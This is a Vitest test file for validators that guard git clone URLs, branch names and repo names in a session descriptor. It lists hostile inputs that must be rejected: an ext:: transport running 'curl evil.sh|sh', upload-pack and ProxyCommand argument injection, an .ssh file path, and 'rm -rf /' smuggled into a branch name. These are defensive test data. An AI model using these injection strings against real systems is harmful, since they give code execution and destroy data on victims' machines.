import { describe, expect, it } from "vitest";
import {
  SESSION_MODES,
  validateBranch,
  validateRepoName,
  validateRepoUrl,
  validateSessionDescriptor,
  parseSessionDescriptor,
  serializeSessionDescriptor,
} from "../src/index.js";

/**
 * The URL table is the highest-value test in the repo.
 *
 * The clone URL reaches a joiner from the relay, which PROTOCOL.md explicitly
 * does not trust. Every row here is a way a crafted descriptor turns
 * `inzo join` into code execution on someone else's machine.
 */
describe("validateRepoUrl — refuses everything that is not https or ssh", () => {
  const attacks: Array<[string, string]> = [
    ["ext:: transport runs a shell command", "ext::sh -c 'curl evil.sh|sh'"],
    ["ext:: with no space", "ext::whoami"],
    ["leading dash is argument injection", "--upload-pack=/bin/sh"],
    ["leading dash before a real url", "-https://github.com/a/b.git"],
    ["file:// clones local disk", "file:///home/victim/.ssh"],
    ["bare local path", "/home/victim/.ssh"],
    ["relative local path", "../../.ssh"],
    ["git:// is unauthenticated", "git://github.com/a/b.git"],
    ["http:// is not https", "http://github.com/a/b.git"],
    ["newline could split a git config", "https://github.com/a/b\nfoo"],
    ["carriage return", "https://github.com/a/b\rfoo"],
    ["null byte", "https://github.com/a/b\u0000"],
    ["internal whitespace", "https://github.com/a b"],
    ["leading whitespace", " https://github.com/a/b"],
    ["https with no host", "https://"],
    ["https with empty host", "https:///path"],
    ["ssh with no host", "ssh://"],
    ["empty string", ""],
  ];

  for (const [why, url] of attacks) {
    it(`rejects ${why}`, () => {
      expect(() => validateRepoUrl(url)).toThrow();
    });
  }

  it("rejects a url longer than the cap", () => {
    expect(() => validateRepoUrl(`https://github.com/${"a".repeat(600)}`)).toThrow(/at most/);
  });

  it("rejects a non-string", () => {
    expect(() => validateRepoUrl(42)).toThrow();
    expect(() => validateRepoUrl({})).toThrow();
  });

  const allowed = [
    "https://github.com/owner/repo.git",
    "https://github.com/owner/repo",
    "https://gitlab.example.com:8443/team/repo.git",
    "ssh://git@github.com/owner/repo.git",
    "git@github.com:owner/repo.git",
    "git@my-host.example.com:team/sub/repo.git",
  ];

  for (const url of allowed) {
    it(`accepts ${url}`, () => {
      expect(validateRepoUrl(url)).toBe(url);
    });
  }
});

describe("validateBranch", () => {
  it("accepts an inzo session branch", () => {
    expect(validateBranch("inzo/7fk2q9")).toBe("inzo/7fk2q9");
  });

  it.each([
    ["a leading dash", "-oProxyCommand=sh"],
    ["a parent-directory traversal", "inzo/../../etc"],
    ["a bare ..", ".."],
    ["a trailing slash", "inzo/"],
    ["a leading slash", "/inzo"],
    ["a doubled slash", "inzo//x"],
    ["a .lock suffix", "inzo/x.lock"],
    ["a space", "inzo/my branch"],
    ["a semicolon", "inzo;rm -rf /"],
    ["an empty string", ""],
  ])("rejects %s", (_why, branch) => {
    expect(() => validateBranch(branch)).toThrow();
  });

  it("rejects a branch longer than the cap", () => {
    expect(() => validateBranch("a".repeat(300))).toThrow(/at most/);
  });
});

describe("validateRepoName", () => {
  it("accepts a plain directory name", () => {
    expect(validateRepoName("my-app")).toBe("my-app");
  });

  it.each([
    ["a path traversal", "../../.ssh"],
    ["a nested path", "a/b"],
    ["dot", "."],
    ["dot dot", ".."],
    ["a leading dash", "-rf"],
    ["a null byte", "app\u0000"],
    ["an empty string", ""],
  ])("rejects %s", (_why, name) => {
    expect(() => validateRepoName(name)).toThrow();
  });
});

describe("validateSessionDescriptor", () => {
  it("accepts every declared mode with no repo", () => {
    for (const mode of SESSION_MODES) {
      expect(validateSessionDescriptor({ mode, repo: null })).toEqual({ mode, repo: null });
    }
  });

  it("treats a missing repo as null", () => {
    expect(validateSessionDescriptor({ mode: "plan" })).toEqual({ mode: "plan", repo: null });
  });

  it("accepts a repo with no remote", () => {
    expect(
      validateSessionDescriptor({ mode: "cowork", repo: { url: null, branch: "inzo/abc", name: "app" } }),
    ).toEqual({ mode: "cowork", repo: { url: null, branch: "inzo/abc", name: "app" } });
  });

  it("rejects an unknown mode", () => {
    expect(() => validateSessionDescriptor({ mode: "cowrok", repo: null })).toThrow(/mode must be one of/);
  });

  it("rejects a non-object", () => {
    for (const bad of [null, "cowork", 7, [], undefined]) {
      expect(() => validateSessionDescriptor(bad)).toThrow();
    }
  });

  it("drops unknown keys rather than storing them", () => {
    const result = validateSessionDescriptor({ mode: "cowork", repo: null, evil: "payload" });
    expect(result).toEqual({ mode: "cowork", repo: null });
    expect("evil" in result).toBe(false);
  });

  it("drops unknown keys inside repo too", () => {
    const result = validateSessionDescriptor({
      mode: "cowork",
      repo: { url: null, branch: "inzo/a", name: "app", evil: "payload" },
    });
    expect(result.repo && "evil" in result.repo).toBe(false);
  });

  it("propagates a bad url from inside repo", () => {
    expect(() =>
      validateSessionDescriptor({ mode: "cowork", repo: { url: "ext::sh -c x", branch: "inzo/a", name: "app" } }),
    ).toThrow();
  });
});

describe("parse/serialize round trip", () => {
  it("round-trips a full descriptor", () => {
    const descriptor = validateSessionDescriptor({
      mode: "build",
      repo: { url: "https://github.com/a/b.git", branch: "inzo/xyz", name: "b" },
    });
    expect(parseSessionDescriptor(serializeSessionDescriptor(descriptor))).toEqual(descriptor);
  });

  it("returns null for absent storage rather than throwing", () => {
    expect(parseSessionDescriptor(null)).toBeNull();
    expect(parseSessionDescriptor(undefined)).toBeNull();
    expect(parseSessionDescriptor("")).toBeNull();
  });

  it("returns null for a descriptor an older build wrote badly", () => {
    // Degrading to "no session settings" is right; taking down the pairing
    // that owns the row is not.
    expect(parseSessionDescriptor("{not json")).toBeNull();
    expect(parseSessionDescriptor(JSON.stringify({ mode: "nonsense" }))).toBeNull();
  });

  it("refuses a stored url that would now be rejected", () => {
    expect(parseSessionDescriptor(JSON.stringify({ mode: "cowork", repo: { url: "ext::x", branch: "a", name: "b" } }))).toBeNull();
  });
});
